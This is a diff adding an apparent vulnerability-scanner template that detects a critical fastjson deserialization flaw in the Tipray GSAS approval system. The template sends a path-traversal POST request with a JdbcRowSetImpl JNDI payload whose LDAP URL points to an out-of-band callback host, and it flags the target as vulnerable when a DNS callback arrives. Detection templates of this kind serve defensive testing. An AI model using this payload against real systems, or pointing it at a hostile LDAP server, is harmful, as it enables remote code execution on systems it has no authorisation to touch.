@@ -1,0 +1,37 @@
+id: poc-yaml-tipray-gsas-findtrusteebydeptid-fastjson-deserialization
+info:
+  name: 天锐绿盾审批系统 findTrusteeBydeptId fastjson 反序列化漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: deserialization,dns,oast
+
+variables:
+  domain: "{{interactsh-url}}"
+  random: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - method: POST
+    path:
+      - /trwfe/login.jsp/.%2e/rest/ext/findTrusteeBydeptId
+    headers:
+      Content-Type: application/json
+    body: |-
+      {
+          "@type": "com.sun.rowset.JdbcRowSetImpl",
+          "dataSourceName": "ldap://{{domain}}/{{random}}",
+          "autoCommit": true
+      }
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
